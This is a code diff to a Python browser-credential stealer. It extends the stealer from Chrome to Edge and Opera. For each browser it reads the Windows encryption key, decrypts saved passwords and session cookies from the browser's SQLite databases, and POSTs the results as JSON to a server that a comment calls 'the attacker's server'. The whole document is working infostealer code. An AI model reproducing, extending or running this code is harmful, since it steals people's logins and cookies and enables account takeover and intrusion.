@@ -7,11 +7,24 @@ import os
 import json
 import requests
 
-encKeyPath = r"%s\AppData\Local\Google\Chrome\User Data\Local State"
-loginDataPath = r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+encKeyPaths = [
+    r"%s\AppData\Local\Google\Chrome\User Data\Local State", 
+    r"%s\AppData\Local\Microsoft\Edge\User Data\Local State", 
+    r"%s\AppData\Roaming\Opera Software\Opera Stable\Local State"
+]
+loginDataPaths = [
+    r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data", 
+    r"%s\AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
+    r"%s\AppData\Roaming\Opera Software\Opera Stable\Login Data"
+]
+cookieDataPaths = [
+    r"%s\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",
+    r"%s\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies",
+    r"%s\AppData\Roaming\Opera Software\Opera Stable\Network\Cookies"
+]
 
 # method that gets the encryption key from windows
-def getEncryptionKey(endKeyPath):
+def getEncryptionKey(encKeyPath):
     f = open(os.path.normpath(encKeyPath%(os.environ['USERPROFILE'])))
     opened = f.read()
     db = json.loads(opened)
@@ -37,16 +50,17 @@ def getAndDecryptLoginData(loginDataPath):
     #Connect to sqlite database
     conn = sqlite3.connect('tempdata.db')
     cursor = conn.cursor()
-    #Select statement to retrieve info 
-    curr = '{}'
-    data = json.loads(curr)
+    #Select statement to retrieve info
 
-    return data, cursor, conn
+    return cursor, conn
 
 # method used to build the json file with the stolen data
-def buildJson():
+def buildJson(encKeyPath, loginDataPath):
     enc_key = getEncryptionKey(encKeyPath)
-    data, cursor, conn = getAndDecryptLoginData(loginDataPath)
+    cursor, conn = getAndDecryptLoginData(loginDataPath)
+
+    curr = '{}'
+    data = json.loads(curr)
 
     saveduser = ''
     savedpass = ''
@@ -54,7 +68,6 @@ def buildJson():
     for index,login in enumerate(cursor.fetchall()):
         url = login[0]
         passw = login[2]
-        
         initialisation_vector = passw[3:15]
         encrypted_password = passw[15:-16]
         cipher = AES.new(enc_key, AES.MODE_GCM, initialisation_vector)
@@ -62,21 +75,89 @@ def buildJson():
             'user': login[1],
             'pass': cipher.decrypt(encrypted_password).decode()
         }
+       
     # close connection to db and remove the db made
     conn.close()
     os.remove('tempdata.db')
-
-    with open('data.json', 'w') as f:
-        # Write the JSON data to the file
-        json.dump(data, f)
-
     return data
 
-# get the json file
-dataFile = buildJson()
+# method used to build the json file with the stolen cookie data
+def buildCookieJson(encKeyPath, cookieDataPath):
+    path_cookie_db = os.path.normpath(cookieDataPath%(os.environ['USERPROFILE']))
+    enc_key = getEncryptionKey(encKeyPath)
+    shutil.copy(path_cookie_db, 'tempdata.db')
+    conn = sqlite3.connect('tempdata.db')
+    #needed this to read without decoding to avoid errors
+    conn.text_factory = bytes
+    cursor = conn.cursor()
+
+    curr = '{}'
+    data = json.loads(curr)
+
+    saveduser = ''
+    savedpass = ''
+    cursor.execute("SELECT name, encrypted_value, expires_utc  FROM cookies")
+    for index, name in enumerate(cursor.fetchall()):
+        cookie = name[1]
+        initialisation_vector = cookie[3:15]
+        encrypted_password = cookie[15:-16]
+        cipher = AES.new(enc_key, AES.MODE_GCM, initialisation_vector)
+        cookie = cipher.decrypt(encrypted_password)
+        data[name[0].decode()] = {
+            'value': str(cookie),
+            'expires_utc': name[2]
+        }
+       
+    # close connection to db and remove the db made
+    conn.close()
+    os.remove('tempdata.db')
+    return data
+
+#get the json file
+passFile = None
+cookieFile = None
+files = []
+
+for i in range(len(loginDataPaths)):
+    if i == 0:
+        files.append(buildJson(encKeyPath=encKeyPaths[i], loginDataPath=loginDataPaths[i]))
+        files.append(buildCookieJson(encKeyPath=encKeyPaths[i], cookieDataPath=cookieDataPaths[i]))
+        # with open('ChromePasswords.json', 'w') as f:
+        #     # Write the JSON object to the file
+        #     json.dump(passFile, f, indent=4)
+        # with open('ChromeCookies.json', 'w') as f:
+        #     # Write the JSON object to the file
+        #     json.dump(cookieFile, f, indent=4)
+    if i == 1:
+        files.append(buildJson(encKeyPath=encKeyPaths[i], loginDataPath=loginDataPaths[i]))
+        files.append(buildCookieJson(encKeyPath=encKeyPaths[i], cookieDataPath=cookieDataPaths[i]))
+        # with open('EdgePasswords.json', 'w') as f:
+        #     # Write the JSON object to the file
+        #     json.dump(passFile, f, indent=4)
+        # with open('EdgeCookies.json', 'w') as f:
+        #     # Write the JSON object to the file
+        #     json.dump(cookieFile, f, indent=4)
+    if i == 2:
+        files.append(buildJson(encKeyPath=encKeyPaths[i], loginDataPath=loginDataPaths[i]))
+        files.append(buildCookieJson(encKeyPath=encKeyPaths[i], cookieDataPath=cookieDataPaths[i]))
+        # with open('OperaPasswords.json', 'w') as f:
+        #     # Write the JSON object to the file
+        #     json.dump(passFile, f, indent=4)
+        # with open('OperaCookies.json', 'w') as f:
+        #     # Write the JSON object to the file
+        #     json.dump(cookieFile, f, indent=4)
+
+   
+ 
+# test = buildCookieJson(encKeyPath=encKeyPaths[0], cookieDataPath=cookieDataPaths[0])
+
+# with open('testCookies.json', 'w') as f:
+#     # Write the JSON object to the file
+#     json.dump(test, f, indent=4)
 
 # send the data to the attacker's server
 url = 'http://localhost:5000/send/json'
 headers = {'Content-Type': 'application/json'}  # Set the Content-Type header
-response = requests.post(url, json=dataFile, headers=headers)
-print(response.text)
+for i in range(len(loginDataPaths)*2):
+    response = requests.post(url, json=files[i], headers=headers)
+    print(response.text)
